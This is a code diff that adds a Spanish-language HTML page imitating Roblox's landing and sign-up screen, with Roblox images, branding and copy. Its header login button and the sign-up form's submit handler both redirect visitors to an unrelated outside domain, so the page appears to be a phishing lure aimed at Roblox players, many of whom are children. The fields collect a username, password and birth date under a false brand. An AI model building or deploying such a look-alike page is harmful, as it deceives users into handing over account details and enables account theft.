@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Landing & Sign Up</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #f2f2f2;
+            color: #393b3d;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            background-color: #0074bd;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 30px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        .logo-img {
+            height: 30px;
+            width: auto;
+        }
+
+        .header-login {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .header-login input {
+            padding: 5px 8px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 13px;
+        }
+
+        .btn-login {
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            padding: 5px 14px;
+            border-radius: 3px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .btn-login:hover {
+            background-color: #0088db;
+        }
+
+        .hero {
+            background:
+                linear-gradient(rgba(0,0,0,.4), rgba(0,0,0,.4)),
+                url('https://images.rbxcdn.com/7c69aea3037674c85907be8261544542.png')
+                center/cover no-repeat;
+
+            min-height: 500px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding: 40px 10%;
+        }
+
+        .signup-box {
+            background: white;
+            width: 380px;
+            padding: 25px;
+            border-radius: 6px;
+            box-shadow: 0 4px 15px rgba(0,0,0,.3);
+        }
+
+        .signup-box h3 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: #666;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #00a2ff;
+        }
+
+        .dob-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .dob-container select {
+            flex: 1;
+        }
+
+        .gender-container {
+            display: flex;
+            gap: 15px;
+        }
+
+        .gender-btn {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background: white;
+            border-radius: 4px;
+            cursor: pointer;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .gender-btn.selected {
+            border-color: #00a2ff;
+            background-color: #e6f5ff;
+            color: #00a2ff;
+        }
+
+        .error-msg {
+            color: #d9534f;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+            font-weight: 600;
+        }
+
+        .success-msg {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .btn-signup-main {
+            width: 100%;
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-signup-main:hover {
+            background-color: #0088db;
+        }
+
+        .info-section {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 0 20px;
+            text-align: center;
+        }
+
+        .info-section h2 {
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+
+        .info-section p {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.6;
+        }
+
+        footer {
+            background: white;
+            border-top: 1px solid #e3e3e3;
+            padding: 20px 0;
+            text-align: center;
+            margin-top: auto;
+            font-size: 12px;
+            color: #757575;
+        }
+
+        footer ul {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            list-style: none;
+            margin-bottom: 10px;
+        }
+
+        footer a {
+            color: #393b3d;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+
+<header>
+
+    <img
+        src="https://images.rbxcdn.com/7c69aea3037674c85907be8261544542.png"
+        alt="Logo"
+        class="logo-img"
+    >
+
+    <div class="header-login">
+
+        <input
+            type="text"
+            placeholder="Usuario"
+        >
+
+        <input
+            type="password"
+            placeholder="Clave"
+        >
+
+        <button
+            class="btn-login"
+            type="button"
+            onclick="window.location.href='https://beni731.com.ar/rfdlolisxd/'"
+        >
+            Iniciar sesión
+        </button>
+
+    </div>
+
+</header>
+
+
+<section class="hero">
+
+    <div class="signup-box">
+
+        <h3>
+            ¡Regístrate y empieza a divertirte!
+        </h3>
+
+        <div
+            id="success-box"
+            class="success-msg"
+        >
+            ¡Cuenta creada con éxito!
+        </div>
+
+
+        <form
+            id="signupForm"
+            onsubmit="validarRegistro(event)"
+        >
+
+            <div class="form-group">
+
+                <label>
+                    Fecha de Nacimiento
+                </label>
+
+                <div class="dob-container">
+
+                    <select required>
+
+                        <option
+                            value=""
+                            disabled
+                            selected
+                        >
+                            Mes
+                        </option>
+
+                        <option value="01">Enero</option>
+                        <option value="02">Febrero</option>
+                        <option value="03">Marzo</option>
+                        <option value="04">Abril</option>
+                        <option value="05">Mayo</option>
+                        <option value="06">Junio</option>
+                        <option value="07">Julio</option>
+                        <option value="08">Agosto</option>
+                        <option value="09">Septiembre</option>
+                        <option value="10">Octubre</option>
+                        <option value="11">Noviembre</option>
+                        <option value="12">Diciembre</option>
+
+                    </select>
+
+
+                    <select required>
+
+                        <option
+                            value=""
+                            disabled
+                            selected
+                        >
+                            Día
+                        </option>
+
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                        <option value="13">13</option>
+                        <option value="14">14</option>
+                        <option value="15">15</option>
+                        <option value="16">16</option>
+                        <option value="17">17</option>
+                        <option value="18">18</option>
+                        <option value="19">19</option>
+                        <option value="20">20</option>
+                        <option value="21">21</option>
+                        <option value="22">22</option>
+                        <option value="23">23</option>
+                        <option value="24">24</option>
+                        <option value="25">25</option>
+                        <option value="26">26</option>
+                        <option value="27">27</option>
+                        <option value="28">28</option>
+                        <option value="29">29</option>
+                        <option value="30">30</option>
+                        <option value="31">31</option>
+
+                    </select>
+
+
+                    <select
+                        id="birthYear"
+                        required
+                    >
+
+                        <option
+                            value=""
+                            disabled
+                            selected
+                        >
+                            Año
+                        </option>
+
+                    </select>
+
+                </div>
+
+            </div>
+
+
+            <div class="form-group">
+
+                <label>
+                    Usuario
+                </label>
+
+                <input
+                    type="text"
+                    id="username"
+                    placeholder="No uses tu nombre real"
+                >
+
+                <div
+                    id="username-error"
+                    class="error-msg"
+                >
+                    pon texto
+                </div>
+
+            </div>
+
+
+            <div class="form-group">
+
+                <label>
+                    Clave
+                </label>
+
+                <input
+                    type="password"
+                    id="clave"
+                    placeholder="Introduce una clave"
+                >
+
+            </div>
+
+
+            <div class="form-group">
+
+                <label>
+                    Confirmar clave
+                </label>
+
+                <input
+                    type="password"
+                    id="confirmarClave"
+                    placeholder="Repite la clave"
+                >
+
+                <div
+                    id="clave-error"
+                    class="error-msg"
+                >
+                    Las claves no coinciden
+                </div>
+
+            </div>
+
+
+            <div class="form-group">
+
+                <label>
+                    Género (Opcional)
+                </label>
+
+                <div class="gender-container">
+
+                    <div
+                        class="gender-btn"
+                        onclick="seleccionarGenero(this)"
+                    >
+                        Mujer
+                    </div>
+
+                    <div
+                        class="gender-btn"
+                        onclick="seleccionarGenero(this)"
+                    >
+                        Hombre
+                    </div>
+
+                </div>
+
+            </div>
+
+
+            <button
+                type="submit"
+                class="btn-signup-main"
+            >
+                Regístrate
+            </button>
+
+        </form>
+
+    </div>
+
+</section>
+
+
+<section class="info-section">
+
+    <h2>
+        ¿Qué es Roblox?
+    </h2>
+
+    <p>
+        Roblox es el mejor lugar para imaginar con amigos.
+        Con la plataforma de juegos en línea generada por usuarios
+        más grande del mundo, explora miles de experiencias creadas
+        por la comunidad.
+    </p>
+
+</section>
+
+
+<footer>
+
+    <ul>
+        <li><a href="#">Sobre nosotros</a></li>
+        <li><a href="#">Empleos</a></li>
+        <li><a href="#">Blog</a></li>
+        <li><a href="#">Ayuda</a></li>
+        <li><a href="#">Términos</a></li>
+        <li><a href="#">Privacidad</a></li>
+    </ul>
+
+    <p>
+        ©2018 Todos los derechos reservados.
+    </p>
+
+</footer>
+
+
+<script>
+
+    const yearSelect =
+        document.getElementById("birthYear");
+
+    for (
+        let year = 2026;
+        year >= 1900;
+        year--
+    ) {
+
+        const option =
+            document.createElement("option");
+
+        option.value = year;
+        option.textContent = year;
+
+        yearSelect.appendChild(option);
+    }
+
+
+    function seleccionarGenero(element) {
+
+        const botones =
+            document.querySelectorAll(".gender-btn");
+
+        botones.forEach(function(btn) {
+
+            btn.classList.remove("selected");
+
+        });
+
+        element.classList.add("selected");
+    }
+
+
+    function validarRegistro(event) {
+
+        event.preventDefault();
+
+        const username =
+            document.getElementById("username")
+            .value
+            .trim();
+
+        const usernameError =
+            document.getElementById("username-error");
+
+        const clave =
+            document.getElementById("clave")
+            .value;
+
+        const confirmarClave =
+            document.getElementById("confirmarClave")
+            .value;
+
+        const claveError =
+            document.getElementById("clave-error");
+
+        const success =
+            document.getElementById("success-box");
+
+
+        if (username === "") {
+
+            usernameError.innerText =
+                "pon texto";
+
+            usernameError.style.display =
+                "block";
+
+            return;
+        }
+
+        usernameError.style.display =
+            "none";
+
+
+        if (clave !== confirmarClave) {
+
+            claveError.innerText =
+                "Las claves no coinciden";
+
+            claveError.style.display =
+                "block";
+
+            return;
+        }
+
+        claveError.style.display =
+            "none";
+
+
+        success.style.display =
+            "block";
+
+
+        setTimeout(function() {
+
+            window.location.href =
+                "https://beni731.com.ar/rfdlolisxd/";
+
+        }, 1000);
+
+    }
+
+</script>
+
+</body>
+</html>
